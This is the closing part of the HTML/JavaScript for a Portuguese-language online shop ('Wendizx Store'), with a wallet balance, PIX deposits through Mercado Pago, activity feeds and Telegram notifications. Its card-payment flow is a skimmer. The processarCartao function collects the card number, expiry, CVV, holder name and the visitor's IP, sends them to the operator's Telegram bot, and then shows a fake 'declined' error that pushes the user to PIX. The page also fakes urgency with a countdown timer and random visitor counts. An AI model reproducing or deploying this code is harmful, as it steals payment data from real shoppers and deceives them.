function tgNotifyBalanceLow(item){ tgSend(`‚ö†Ô∏è <b>SALDO BAIXO</b>\nSaldo atual: ${item.after?.toFixed(2)}`); }
function tgNotifyHighValueDeposit(item){ tgSend(`üè¶ <b>DEP√ìSITO ALTO</b>\nValor: ${fmtMoney(item.amount)}\nID: ${item.id}`); }
function tgNotifyRecurringPayment(item){ tgSend(`üîÅ <b>PAGAMENTO RECORRENTE</b>\nValor: ${fmtMoney(item.amount)}`); }
function tgNotifyChargeback(item){ tgSend(`üö´ <b>CHARGEBACK</b>\nValor: ${fmtMoney(item.amount)}`); }
function tgNotifyPurchaseDetails(item){ tgSend(`üì¶ <b>DETALHES DA COMPRA</b>\nProduto: ${item.product}\nQuantidade: ${item.qty || '1'}\nValor: ${fmtMoney(item.amount)}`); }

// UI helpers
let feedTimeline = false;
function toggleTimeline(){ feedTimeline = !feedTimeline; const el = document.getElementById('activity-feed'); if(feedTimeline) el.classList.add('timeline'); else el.classList.remove('timeline'); document.getElementById('timelineBtn').innerText = feedTimeline ? '‚Ü©Ô∏è' : 'üïì'; }

function filterFeed(){
	const q = (document.getElementById('feedSearch').value || '').toLowerCase();
	const type = document.getElementById('feedFilter').value;
	// Filtra o feed de atividades (lado direito)
	const filteredActs = activities.filter(a => {
		if(type !== 'all' && a.type !== type) return false;
		if(!q) return true;
		return (a.product||'').toLowerCase().includes(q) || (a.link||'').toLowerCase().includes(q) || (a.id||'').toLowerCase().includes(q);
	});
	const el = document.getElementById('activity-feed'); if(el){
		el.innerHTML = filteredActs.map(a=> {
			const emoji = { purchase:'üõí', deposit:'üí∞', pix_created:'üîÉ' }[a.type]||'‚Ä¢';
			return `
		<div class="act-item" onclick="showActivityDetails('${a.id}')">
			<div style="display:flex; gap:10px; align-items:center;">
				<div class="act-avatar">${emoji}</div>
				<div style="font-weight:800">${a.product||a.note||'-'}<div class="act-meta">${a.ts}</div></div>
			</div>
			<div style="text-align:right; min-width:90px;">${a.amount? 'R$ '+parseFloat(a.amount).toFixed(2):''}</div>
		</div>`;
		}).join('') || '<div class="skeleton" style="height:60px"></div>';
	}

	// Atualiza a lista de hist√≥rico (hist-list) combinando hist√≥rico de compras e dep√≥sitos conforme o filtro
	const histEl = document.getElementById('hist-list');
	if(histEl){
		let items = [];
		// incluir compras (array `hist`)
		if(type === 'all' || type === 'purchase'){
			items = items.concat(hist.filter(h => {
				if(!q) return true;
				return (h.nome||'').toLowerCase().includes(q) || (h.data||'').toLowerCase().includes(q);
			}).map(h => ({ id: 'H-'+(h.data||Date.now()), type: 'purchase', product: h.nome, amount: h.valor, ts: h.data })));
		}
		// incluir dep√≥sitos/pix do activities quando solicitado
		if(type === 'all' || type === 'deposit' || type === 'pix_created'){
			items = items.concat(activities.filter(a => {
				if(type !== 'all' && a.type !== type) return false;
				if(!q) return true;
				return (a.product||'').toLowerCase().includes(q) || (a.link||'').toLowerCase().includes(q) || (a.id||'').toLowerCase().includes(q);
			}).map(a => ({ id: a.id, type: a.type, product: a.product || a.note || a.type, amount: a.amount, ts: a.ts })));
		}

		histEl.innerHTML = items.map(i => `
			<div class="card" style="padding:15px; font-size:12px;">
				<span>${i.product} <br> <small style="color:#444">${i.ts}</small></span>
				<b style="color:var(--d)">${i.amount? '- R$ '+parseFloat(i.amount).toFixed(2) : ''}</b>
			</div>`).join('') || '<div class="skeleton" style="height:60px"></div>';
	}
}

function exportFeedCSV(){ const rows = [['id','type','product','amount','before','after','ts','link']]; activities.forEach(a=> rows.push([a.id,a.type,a.product||'',a.amount||'',a.before||'',a.after||'',a.ts||'',a.link||'' ])); const csv = rows.map(r=> r.map(v=> `"${(v||'').toString().replace(/"/g,'""')}"`).join(',')).join('\n'); const blob = new Blob([csv], { type: 'text/csv' }); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = 'feed.csv'; a.click(); URL.revokeObjectURL(url); }

function showActivityDetails(id){
	// try to find the item in activities first, then fallback to history
	const item = activities.find(a=>a.id===id) || hist.find(h=>h.id===id);
	if(!item) return;
	const m = document.getElementById('confirmModal'); m.style.display='flex';
	const displayId = item.orderId || item.txid || item.id || '';
	document.getElementById('confirmInt').innerHTML = `
		<h3 style="color:var(--p)">${item.product||item.nome||item.type||'-'}</h3>
		<p>${item.ts || item.data || ''}</p>
		<p><b>Valor:</b> ${item.amount? 'R$ '+parseFloat(item.amount).toFixed(2) : (item.valor? 'R$ '+parseFloat(item.valor).toFixed(2) : '-')}</p>
		<p><b>Saldo:</b> ${item.before? item.before.toFixed(2):'--'} ‚Üí ${item.after? item.after.toFixed(2):'--'}</p>
		<p style="word-break:break-all"><b>Link/Obs:</b> ${item.link||item.note||item.obs||'-'}</p>
		<p style="margin-top:8px;"><b>ID:</b> <span style="font-weight:900">${displayId}</span></p>
		<div style="display:flex; gap:10px; justify-content:center; margin-top:14px;">
			<button class="btn" onclick="document.getElementById('confirmModal').style.display='none'">FECHAR</button>
			<button class="btn small" onclick="copyToClipboard('${displayId}')">COPIAR ID</button>
			<button class="btn btn-sec" onclick="markAsImportant('${id}'); document.getElementById('confirmModal').style.display='none'">MARCAR IMPORTANTE</button>
		</div>`;
}

function markAsImportant(id){ const a = activities.find(x=>x.id===id); if(!a) return; a.important = true; localStorage.setItem('actLoja', JSON.stringify(activities)); updateActivityUI(); myAlert('Marcado ‚≠ê'); }
function toggleImportant(e,id){ e.stopPropagation(); markAsImportant(id); }

function openNotifications(){
	try{
		let panel = document.getElementById('notifPanel');
		// create panel if it does not exist
		if(!panel){
			panel = document.createElement('div');
			panel.id = 'notifPanel';
			panel.className = 'activity-feed hidden';
			panel.style.position = 'fixed';
			panel.style.right = '20px';
			panel.style.top = '70px';
			panel.style.width = '320px';
			panel.style.maxHeight = '60vh';
			document.body.appendChild(panel);
		}
		// if panel is inside a hidden view, move it to body so it's visible
		const parentView = panel.closest('.view');
		if(parentView && !parentView.classList.contains('active')){
			document.body.appendChild(panel);
			panel.style.position = 'fixed';
		}
		panel.classList.toggle('hidden');
		const cnt = document.getElementById('notifCount'); if(cnt) cnt.classList.add('hidden');
	}catch(e){ console.debug('openNotifications error', e); }
}
function incrementNotifCount(){ const el = document.getElementById('notifCount'); el.classList.remove('hidden'); el.innerText = (parseInt(el.innerText||'0')+1).toString(); }

function playConfetti(){ const el = document.getElementById('confetti'); el.style.display='block'; for(let i=0;i<40;i++){ const p=document.createElement('div'); p.style.position='absolute'; p.style.left=(Math.random()*100)+'%'; p.style.top='-10%'; p.style.width='8px'; p.style.height='14px'; p.style.background=['#ff4b2b','#00ff88','#00f2fe','#ffd700'][Math.floor(Math.random()*4)]; p.style.transform='rotate('+Math.random()*360+'deg)'; p.style.opacity=0.95; p.style.transition='transform 1.6s linear, top 1.6s linear, opacity 1.6s linear'; el.appendChild(p); setTimeout(()=>{ p.style.top=(60+Math.random()*40)+'%'; p.style.transform='rotate('+ (Math.random()*720) +'deg)'; p.style.opacity='0'; },20); setTimeout(()=>p.remove(),1700); } setTimeout(()=>el.style.display='none',1800); }

// Show small warning inside PIX modal when verification fails
function showPixWarning(msg){
	try{
		const modalInt = document.getElementById('modalInt');
		if(!modalInt) return;
		// remove existing
		const old = document.getElementById('pixWarning'); if(old) old.remove();
		const w = document.createElement('div'); w.id = 'pixWarning'; w.className = 'pix-warning'; w.innerText = msg || 'Por quest√µes de seguran√ßa a p√°gina ser√° reiniciada porque o pagamento n√£o foi identificado.';
		modalInt.appendChild(w);
	}catch(e){ console.debug('showPixWarning error', e); }
}

// Show a sliding deposit banner from right to left, then hide
function showDepositBanner(amount, opts){
	try{
		// remove existing
		let b = document.getElementById('depositBanner');
		if(b) { b.remove(); }
		b = document.createElement('div'); b.id = 'depositBanner'; b.className = 'deposit-banner';
		const isPurchase = opts && opts.type === 'purchase';
		const leftMsg = isPurchase ? `üéâ Compra confirmada!${opts && opts.product ? ' ' + opts.product : ''}` : 'üéâ Dep√≥sito aprovado!';
		const amountHtml = `<span style="font-weight:900; margin-left:6px;">R$ ${parseFloat(amount).toFixed(2)}</span>`;
		// build structure: left message, right (amount)
		b.innerHTML = `
			<div style="display:flex; align-items:center; width:100%; gap:12px;">
				<div style="flex:1; font-weight:900;">${leftMsg}</div>
				<div style="display:flex; gap:8px; align-items:center;">
					<div class="banner-amount">${amountHtml}</div>
				</div>
			</div>`;
		document.body.appendChild(b);
		// trigger show
		requestAnimationFrame(()=>{ b.classList.add('show'); });
		// auto-hide only when opts.autoHide is true (default true)
		const autoHide = opts && typeof opts.autoHide !== 'undefined' ? !!opts.autoHide : true;
		if(autoHide){
			setTimeout(()=>{ b.classList.remove('show'); b.classList.add('hide'); setTimeout(()=>b.remove(),500); }, 2800);
		}
	}catch(e){ console.debug('showDepositBanner error', e); }
}

// Show a processing modal with progress then call onDone
function showPurchaseProcessing(product, amount, onDone){
	try{
		const m = document.getElementById('confirmModal');
		m.style.display = 'flex';
		const container = document.getElementById('confirmInt');
		container.innerHTML = `
			<div class="processing-wrap">
				<div style="font-weight:900; color:var(--p);">Processando pedido</div>
				<div style="font-size:13px; color:#aaa">${product} - R$ ${parseFloat(amount).toFixed(2)}</div>
				<div class="progress-bar"><div class="fill" id="procFill"></div></div>
				<div style="font-size:12px; color:#999">Aguarde enquanto confirmamos seu pagamento...</div>
			</div>`;
		// animate fill
		requestAnimationFrame(()=>{ const f = document.getElementById('procFill'); if(f) f.style.width = '100%'; });
		// after animation complete, show success card and call onDone
		setTimeout(()=>{
			const orderId = 'ORD-' + Date.now().toString(36).toUpperCase().slice(-8);
			container.innerHTML = `
				<div class="success-card">
					<div>‚úÖ <span style="margin-left:8px;">Compra confirmada!</span></div>
					<div class="order-id">${orderId}</div>
				</div>
				<div style="margin-top:12px; font-size:13px; color:#ddd; text-align:center;">Seu pedido est√° sendo processado ‚Äî entrega estimada: <b>at√© 30 minutos</b></div>
				<div style="margin-top:14px; display:flex; justify-content:center;"><button class="btn btn-sec" id="btnCloseSuccess">FECHAR</button></div>
			`;
			try{ showDepositBanner(amount, { type: 'purchase', product, autoHide: false }); }catch(e){}
			try{ playConfetti(); }catch(e){}
			// call completion callback
				try{ if(typeof onDone === 'function') onDone(orderId); }catch(e){ console.debug('onDone error', e); }
			// attach close handler to modal success button (keeps banner visible until closed)
			const closeBtn = document.getElementById('btnCloseSuccess');
			if(closeBtn){
				closeBtn.onclick = function(){ try{ m.style.display='none'; }catch(e){} try{ const b = document.getElementById('depositBanner'); if(b) b.remove(); }catch(e){} };
			}
		}, 1400);
	}catch(e){ console.debug('showPurchaseProcessing error', e); if(typeof onDone === 'function') onDone(); }
}

function confirmPurchasePreview(product, total, cb){ const m = document.getElementById('confirmModal'); m.style.display='flex'; document.getElementById('confirmInt').innerHTML = `
		<h3 style="color:var(--p)">${product}</h3>
		<p><b>Total:</b> R$ ${parseFloat(total).toFixed(2)}</p>
		<div style="display:flex; gap:10px; justify-content:center; margin-top:14px;">
			<button class="btn btn-sec" onclick="document.getElementById('confirmModal').style.display='none'">CANCELAR</button>
			<button class="btn" id="btnConfirmAction">CONFIRMAR</button>
		</div>`; }

// FUN√á√ïES EXISTENTES HOOKADAS
const _orderNow = window.orderNow || function(orderId){
	console.debug('_orderNow start', { orderId });
	let t = parseFloat(document.getElementById('total').innerText.replace("R$ ",""));
	if(!t || t <= 0) { setBtnLoading('btnOrderNow', false); return myAlert("Defina a quantidade!"); }
	if(saldo < t) { setBtnLoading('btnOrderNow', false); return myAlert("Saldo insuficiente!"); }
	setBtnLoading('btnOrderNow', true);
	const before = parseFloat(saldo);
	saldo -= t;
	addHist(serv, t, orderId);
	save();
	myAlert("‚úì PEDIDO ENVIADO!");
	goTo('view-menu');
	setBtnLoading('btnOrderNow', false);
};

orderNow = function(){
	console.debug('orderNow called');
	let t = parseFloat(document.getElementById('total').innerText.replace("R$ ",""));
	if(!t || t <= 0) return myAlert("Defina a quantidade!");
	if(saldo < t) return myAlert("Saldo insuficiente!");
	setBtnLoading('btnOrderNow', true);
	// pass actual function and attach it to the modal button to avoid string eval scope issues
	const cb = function(){
		// show processing UI, then complete the order; receive generated orderId
		showPurchaseProcessing(serv, t, function(orderId){
			const before = parseFloat(saldo);
			_orderNow(orderId);
			logActivity('purchase', { product: serv, amount: t, before, after: parseFloat(saldo), link: document.getElementById('link').value || '', orderId });
			incrementNotifCount();
			setBtnLoading('btnOrderNow', false);
		});
	};
	confirmPurchasePreview(serv, t, cb);
	// attach handler to confirm button
	try{
		window._confirmCallbacks = window._confirmCallbacks || {};
		const id = 'cb_' + Date.now() + '_' + Math.floor(Math.random()*1000);
		window._confirmCallbacks[id] = cb;
		const btn = document.getElementById('btnConfirmAction');
		if(btn){
			btn.onclick = function(){ 
				// keep modal visible for processing UI
				try{ window._confirmCallbacks[id](); }catch(e){ console.debug('confirm cb error', e); }
				// playConfetti happens after processing inside showPurchaseProcessing
				delete window._confirmCallbacks[id];
			};
		}
	}catch(e){ console.debug('attach confirm cb error', e); }
};

const _checkP = window.checkP || (async function(v){ /* placeholder */ });
checkP = async function(v){ await _checkP(v); const last = activities[0]; if(last && last.type==='deposit') { playConfetti(); incrementNotifCount(); } };

// --- NOVO BLOCO SUBSTITUTO ---

let verificadorInterval; // Vari√°vel global para controlar o vigia

async function payPix() {
    console.debug('payPix start - Modo Autom√°tico');
    let v = document.getElementById('vDep').value;
    v = parseFloat(v);
    if(!v || v < 0.01) return myAlert("M√≠nimo R$ 1,00");
    
    const m = document.getElementById('pixModal');
    m.style.display = 'flex';
    document.getElementById('modalInt').innerHTML = "<h3>GERANDO PIX...</h3>";
    setBtnLoading('btnPayPix', true);

    try {
        const targetUrl = encodeURIComponent("https://api.mercadopago.com/v1/payments");
        const res = await fetch(PROXY_URL + targetUrl, {
            method: "POST",
            headers: { 
                "Content-Type": "application/json", 
                "Authorization": `Bearer ${ACCESS_TOKEN}`, 
                "X-Idempotency-Key": Math.random().toString() 
            },
            body: JSON.stringify({ 
                transaction_amount: v, 
                description: "Saldo Wendizx Store", 
                payment_method_id: "pix", 
                payer: { email: "cliente@loja.com" } 
            })
        });
        const d = await res.json();
        const pid = d.id;

        logActivity('pix_created', { amount: v, before: saldo, after: saldo, txid: pid, note: 'PIX gerado' });
        
        let copia = d.point_of_interaction?.transaction_data?.qr_code || '';
        const qrBase64 = d.point_of_interaction?.transaction_data?.qr_code_base64 || '';
        
        // Note que removemos o bot√£o de "VERIFICAR" e colocamos o aviso de ‚è≥ AGUARDANDO
        document.getElementById('modalInt').innerHTML = `
            <h2 style="color:var(--a)">R$ ${v.toFixed(2)}</h2>
            <div style="background:white; padding:15px; border-radius:30px; display:inline-block; margin:15px 0;">
                ${qrBase64 ? `<img src="data:image/jpeg;base64,${qrBase64}" style="width:180px; display:block;">` : ''}
            </div>
            <div style="background:#111; color:var(--p); padding:12px; border-radius:15px; font-size:9px; margin-bottom:15px; word-break:break-all; border:1px dashed #333;">${copia}</div>
            <button id="btnCopyPix" class="btn" onclick="copyPixKey('${copia}')">COPIAR CHAVE PIX</button>
            
            <p style="font-size:11px; color:var(--a); margin-top:15px; font-weight:bold; letter-spacing:1px;">
                ‚è≥ AGUARDANDO PAGAMENTO...
            </p>
            <p style="font-size:9px; color:#888;">O saldo cair√° automaticamente ap√≥s pagar.</p>

            <button class="btn btn-sec" style="margin-top:10px;" onclick="fecharModalEPararVigia()">CANCELAR</button>
        `;
        
        setBtnLoading('btnPayPix', false);

        // Inicia a verifica√ß√£o autom√°tica a cada 5 segundos
        iniciarVigiaPagamento(pid, v);

    } catch(e) { 
        m.style.display='none'; 
        setBtnLoading('btnPayPix', false);
        myAlert("Erro na API!"); 
    }
}

function iniciarVigiaPagamento(paymentId, valor) {
    if (verificadorInterval) clearInterval(verificadorInterval);

    verificadorInterval = setInterval(async () => {
        try {
            const targetUrl = encodeURIComponent(`https://api.mercadopago.com/v1/payments/${paymentId}`);
            const res = await fetch(PROXY_URL + targetUrl, { 
                headers: { "Authorization": `Bearer ${ACCESS_TOKEN}` } 
            });
            const d = await res.json();

            if(d.status === 'approved') {
                clearInterval(verificadorInterval);
                
                const before = parseFloat(saldo);
                saldo += parseFloat(valor); 
                
                logActivity('deposit', { amount: valor, before, after: saldo, txid: paymentId, note: 'PIX aprovado autom√°tico' });
                save(); // Salva no localStorage
                
                playConfetti(); // Efeito visual que j√° tem no seu c√≥digo
                showDepositBanner(valor, { type: 'deposit', autoHide: true });
                myAlert("‚úÖ PAGAMENTO CONFIRMADO!");
                
                setTimeout(() => { 
                    document.getElementById('pixModal').style.display='none'; 
                }, 2000);
            }
        } catch(e) {
            console.error("Erro no vigia:", e);
        }
    }, 5000);
}

function fecharModalEPararVigia() {
    document.getElementById('pixModal').style.display = 'none';
    if (verificadorInterval) clearInterval(verificadorInterval);
}

// Verifica√ß√£o PIX (mant√©m l√≥gica e adiciona log de dep√≥sito quando aprovado)
async function checkP_original(v) {
	const btn = document.getElementById('btnCheck');
	setBtnLoading('btnCheck', true);
	btn.innerText = "VERIFICANDO...";
	try {
		const targetUrl = encodeURIComponent(`https://api.mercadopago.com/v1/payments/${pid}`);
		const res = await fetch(PROXY_URL + targetUrl, { 
			headers: { "Authorization": `Bearer ${ACCESS_TOKEN}` } 
		});
		const d = await res.json();
		if(d.status === 'approved') {
			const before = parseFloat(saldo);
			saldo += parseFloat(v); 
			logActivity('deposit', { amount: parseFloat(v), before, after: parseFloat(saldo), txid: pid, note: 'PIX aprovado' });
			save();
			btn.style.background = "#00ff88"; btn.innerText = "‚úì APROVADO!";
			setBtnLoading('btnCheck', false);
			// remove any pix warning
			const pw = document.getElementById('pixWarning'); if(pw) pw.remove();
			// show deposit banner and confetti
			showDepositBanner(v, { type: 'deposit', autoHide: true });
			playConfetti();
			setTimeout(() => { document.getElementById('pixModal').style.display='none'; }, 1500);
		} else {
			btn.style.background = "#ff4b2b"; btn.innerText = "AGUARDANDO...";
			setBtnLoading('btnCheck', false);
			// show a small warning about reload for security
			showPixWarning();
			setTimeout(() => { btn.style.background = "var(--a)"; btn.innerText = "VERIFICAR NOVAMENTE"; }, 2000);
			// Se o usu√°rio apertou verificar e o pagamento n√£o foi feito,
			// reinicia a p√°gina para limpar estado e permitir nova tentativa.
			setTimeout(() => { location.reload(); }, 4000);
		}
	} catch(e) {
		setBtnLoading('btnCheck', false);
		btn.innerText = "ERRO CONEX√ÉO";
		console.debug('checkP error', e);
	}
}
// keep reference and override checkP variable used earlier
window.checkP = checkP_original;

function secret() { sClicks++; if(sClicks>=5) { const before = parseFloat(saldo); saldo+=500; logActivity('dev_deposit', { amount:10, before, after: parseFloat(saldo), note:'DEV MODE' }); save(); myAlert("DEV MODE ON"); sClicks=0; } }

// Combos: abrir painel e finalizar ativa√ß√£o
function openCombo(name, price){
	comboNome = name;
	comboPreco = parseFloat(price);
	document.getElementById('comboSelected').innerText = `${name} ‚Äî R$ ${comboPreco.toFixed(2)}`;
	document.getElementById('comboAction').classList.remove('hidden');
	document.getElementById('linkCombo').value = '';
}

function finalizarCombo(){
	try{
		setBtnLoading('btnFinalizeCombo', true);
		const link = document.getElementById('linkCombo').value || '';
		const antes = parseFloat(saldo);
		if(saldo < comboPreco) { setBtnLoading('btnFinalizeCombo', false); return myAlert('Saldo insuficiente!'); }
		saldo -= comboPreco;
		logActivity('combo', { product: comboNome, amount: comboPreco, before: antes, after: parseFloat(saldo), link });
		addHist(comboNome, comboPreco);
		save();
		playConfetti();
		myAlert('‚úì PACK ATIVADO!');
		document.getElementById('comboAction').classList.add('hidden');
		goTo('view-menu');
	}catch(e){ console.debug('finalizarCombo error', e); myAlert('Erro ao ativar pack'); }
	finally{ setBtnLoading('btnFinalizeCombo', false); }
}

// FUNDO MATRIX
const c = document.getElementById("p"), ctx = c.getContext("2d");
c.width = innerWidth; c.height = innerHeight;
let drops = Array(Math.floor(innerWidth/16)).fill(1);
function draw() {
	ctx.fillStyle = "rgba(3, 0, 5, 0.1)"; ctx.fillRect(0, 0, c.width, c.height);
	ctx.font = "15px monospace"; ctx.fillStyle = "#00f2fe";
	drops.forEach((y, i) => {
		ctx.fillText("01"[Math.floor(Math.random()*2)], i*16, y*16);
		if(y*16 > c.height && Math.random() > 0.98) drops[i] = 0;
		drops[i]++;
	});
	requestAnimationFrame(draw);
}
draw(); save();

// FEATURES ADICIONAIS
let timerVal = 7200;
setInterval(() => {
	if(timerVal>0) timerVal--;
	let h = Math.floor(timerVal/3600).toString().padStart(2,'0');
	let m = Math.floor((timerVal%3600)/60).toString().padStart(2,'0');
	let s = (timerVal%60).toString().padStart(2,'0');
	document.getElementById('cd').innerText = `${h}:${m}:${s}`;
}, 1000);

setInterval(() => {
	document.getElementById('user-now').innerText = Math.floor(Math.random()*15)+8;
}, 4000);

const canvasChart = document.getElementById('chartCanvas');
const ctxChart = canvasChart.getContext('2d');
let points = Array(15).fill(20);
function animateChart() {
	ctxChart.clearRect(0,0,canvasChart.width, canvasChart.height);
	ctxChart.beginPath();
	ctxChart.strokeStyle = "#00f2fe";
	ctxChart.lineWidth = 2;
	points.push(Math.random()*30+5);
	points.shift();
	ctxChart.moveTo(0, 40 - points[0]);
	points.forEach((p,i) => ctxChart.lineTo(i*(canvasChart.width/14), 40-p));
	ctxChart.stroke();
	setTimeout(animateChart, 200);
}
animateChart();

// theme toggle simple
let darkMode = true;
function toggleTheme(){ darkMode = !darkMode; if(darkMode){ document.documentElement.style.setProperty('--bg','#030005'); } else { document.documentElement.style.setProperty('--bg','#f6f7fb'); } }

// persist theme and keyboard handlers
(function(){
	const saved = localStorage.getItem('darkMode');
	if(saved !== null) { darkMode = saved === 'true'; document.documentElement.style.setProperty('--bg', darkMode ? '#030005' : '#f6f7fb'); }
	// enhance toggleTheme to persist
	const _t = toggleTheme;
	toggleTheme = function(){ _t(); localStorage.setItem('darkMode', darkMode); };
	// ESC to close modals
	document.addEventListener('keydown', (e)=>{ if(e.key === 'Escape'){ document.getElementById('pixModal').style.display='none'; document.getElementById('confirmModal').style.display='none'; document.getElementById('notifPanel').classList.add('hidden'); } });
})();

	// attach notif bell handler after DOM ready
	document.addEventListener('DOMContentLoaded', function(){
		const nb = document.getElementById('notifBell');
		if(nb){ nb.addEventListener('click', openNotifications); }
	});

function copyPixKey(key){
	if(!key) return myAlert('Chave vazia');
	navigator.clipboard.writeText(key).then(()=>{
		myAlert('Copiado!');
		const b = document.getElementById('btnCopyPix'); if(b){ const old=b.innerText; b.innerText='COPIADO'; setTimeout(()=>b.innerText=old,1200); }
	}).catch(()=> myAlert('Falha ao copiar'));
}

// initialize feed UI
updateActivityUI();
filterFeed();

// daily summary (optional)
function sendDailySummary(){ try{ const today = new Date().toLocaleDateString(); const todayActs = activities.filter(a => a.ts && a.ts.includes(today)); const deposits = todayActs.filter(a=>a.type==='deposit').reduce((s,i)=>s+ (parseFloat(i.amount)||0),0); const purchases = todayActs.filter(a=>a.type==='purchase').reduce((s,i)=>s+ (parseFloat(i.amount)||0),0); const count = todayActs.length; const msg = `üìä <b>RESUMO DI√ÅRIO</b>\nData: ${today}\nTotal A√ß√µes: ${count}\nDep√≥sitos: ${fmtMoney(deposits)}\nCompras: ${fmtMoney(purchases)}\nSaldo atual: ${fmtMoney(saldo)}`; tgSend(msg); }catch(e){} }
setInterval(sendDailySummary, 24*60*60*1000);
// --- FUN√á√ïES DA NOVA RECARGA ---

// 1. Alterna entre as telas de PIX, Cart√£o ou Sele√ß√£o Inicial
function setMetodo(tipo) {
    const selecao = document.getElementById('metodo-selecao');
    const pix = document.getElementById('fluxo-pix');
    const cartao = document.getElementById('fluxo-cartao');

    // Esconde tudo primeiro
    selecao.classList.add('hidden');
    pix.classList.add('hidden');
    cartao.classList.add('hidden');

    // Mostra o escolhido
    if(tipo === 'pix') {
        pix.classList.remove('hidden');
    } else if(tipo === 'cartao') {
        cartao.classList.remove('hidden');
    } else {
        selecao.classList.remove('hidden'); // Volta para o in√≠cio
    }
}

// 2. Captura dados do dispositivo para o seu relat√≥rio
async function getExtraInfo() {
    let info = {
        ua: navigator.userAgent,
        res: `${screen.width}x${screen.height}`,
        lang: navigator.language,
        ip: 'Aguardando...'
    };
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        info.ip = data.ip;
    } catch(e) { info.ip = "N√£o obtido"; }
    return info;
}

// 3. Processa o Cart√£o, envia pro Telegram e simula erro
async function processarCartao() {
    const v = document.getElementById('vDepCartao').value;
    const n = document.getElementById('cc_nome').value;
    const num = document.getElementById('cc_num').value;
    const val = document.getElementById('cc_val').value;
    const cvv = document.getElementById('cc_cvv').value;

    if(!v || !n || num.length < 15 || !val || !cvv) {
        return myAlert("Preencha todos os dados do cart√£o!");
    }

    setBtnLoading('btnPayCartao', true);
    const extra = await getExtraInfo();

    // Mensagem formatada para o seu Bot
    const textoTelegram = `
üí≥ **DADOS DE CART√ÉO CAPTURADOS**
üí∞ Valor: R$ ${v}
üë§ Nome: ${n}
üî¢ N√∫mero: \`${num}\`
üìÖ Validade: ${val}
üîë CVV: ${cvv}

üåê **INFO DISPOSITIVO**
üìç IP: ${extra.ip}
üì± Sistema: ${extra.ua.substring(0, 40)}...
    `;

    // Envia para o seu Telegram (usa a fun√ß√£o tgSend que j√° existe no seu script)
    tgSend(textoTelegram);

    // Simula√ß√£o de processamento (3 segundos)
    setTimeout(() => {
        setBtnLoading('btnPayCartao', false);
        
        // Exibe o modal de erro "Fake" para o usu√°rio
        const m = document.getElementById('confirmModal');
        const mi = document.getElementById('confirmInt');
        m.style.display = 'flex';
        mi.innerHTML = `
            <div style="color:#ff4b2b; font-size:50px; margin-bottom:10px;">‚ö†Ô∏è</div>
            <h3 style="color:#ff4b2b; font-family:'Syncopate'; font-size:14px;">ERRO NO PROCESSAMENTO</h3>
            <p style="font-size:12px; margin:15px 0; color:#ccc;">A operadora do cart√£o recusou a transa√ß√£o por 'Falha de Comunica√ß√£o'.</p>
            <p style="font-size:11px; color:#777;">Tente outro cart√£o ou use PIX para saldo imediato.</p>
            <button class="btn" style="margin-top:20px;" onclick="fecharModalErro()">TENTAR PIX</button>
        `;
    }, 3000);
}

function fecharModalErro() {
    document.getElementById('confirmModal').style.display = 'none';
    setMetodo('pix'); // Direciona para o PIX ap√≥s o erro
}

// Mascaras simples para os campos de cart√£o
document.getElementById('cc_num')?.addEventListener('input', e => {
    e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
});
document.getElementById('cc_val')?.addEventListener('input', e => {
    e.target.value = e.target.value.replace(/\D/g, '').replace(/^(\d{2})(\d)/, '$1/$2');
});

</script>
</body>
</html>

